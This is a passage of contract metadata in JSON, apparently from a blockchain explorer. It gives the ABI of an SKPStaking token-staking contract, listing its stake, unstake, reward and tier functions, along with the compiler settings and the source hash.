"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"}],\"name\":\"_GetStakedDetails\",\"outputs\":[{\"internalType\":\"uint256[10]\",\"name\":\"_totalStakedAvailable\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_totalUnLockedStaked\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_totalLockedStaked\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_totalStaked\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_totalUnStaked\",\"type\":\"uint256[10]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"}],\"name\":\"_GetStakeingRewardDetails\",\"outputs\":[{\"internalType\":\"uint256[10]\",\"name\":\"_rewards\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_totalRewardWithdrawal\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_penaltyCollected\",\"type\":\"uint256[10]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"_GetTotalStakedSKP\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_tierSlab\",\"type\":\"uint256\"}],\"name\":\"_RewardWithdrawal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_tierSlab\",\"type\":\"uint256\"}],\"name\":\"_Stake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_tierSlab\",\"type\":\"uint256\"}],\"name\":\"_UnStakeLockedAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_tierSlab\",\"type\":\"uint256\"}],\"name\":\"_UnStakeUnlockedAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"_VerifyUnStake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_tierSlab\",\"type\":\"uint256\"}],\"name\":\"earned\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"totalearnedinterest\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_startDate\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_endDate\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_tierSlab\",\"type\":\"uint256\"}],\"name\":\"getUnStakePenaltyPer\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"penalty\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"primaryAdmin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_tierSlab\",\"type\":\"uint256\"}],\"name\":\"rewardPerDayToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"perdayinterest\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"stakingToken\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalNumberofStakers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalStakesSKP\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTier1YearStakers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTier2YearStakers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTier3YearStakers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"},{\"internalType\":\"uint256[10]\",\"name\":\"_fromSlab\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_toSlab\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_tierAPY\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_tierPenaltyPer\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_tierLockingPer\",\"type\":\"uint256[10]\"}],\"name\":\"update_Tier\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"totalStakedAvailable\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalUnLockedStaked\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalLockedStaked\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalStaked\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalUnStaked\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"rewards\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalRewardWithdrawal\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"penaltyCollected\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lastStakedUpdateTime\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lastUnStakedUpdateTime\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lastUpdateTime\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_startDate\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_endDate\",\"type\":\"uint256\"}],\"name\":\"view_GetNoofDaysBetweenTwoDate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"_days\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_startDate\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_endDate\",\"type\":\"uint256\"}],\"name\":\"view_GetNoofYearBetweenTwoDate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"_years\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"}],\"name\":\"view_TierYear\",\"outputs\":[{\"internalType\":\"uint256[10]\",\"name\":\"_fromSlab\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_toSlab\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_tierAPY\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_tierPenaltyPer\",\"type\":\"uint256[10]\"},{\"internalType\":\"uint256[10]\",\"name\":\"_tierLockingPer\",\"type\":\"uint256[10]\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SKPStaking", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://82c303d44b27b0b4359cd66c21be046de6a549644451f6817962ef5f1a2d5e8d"}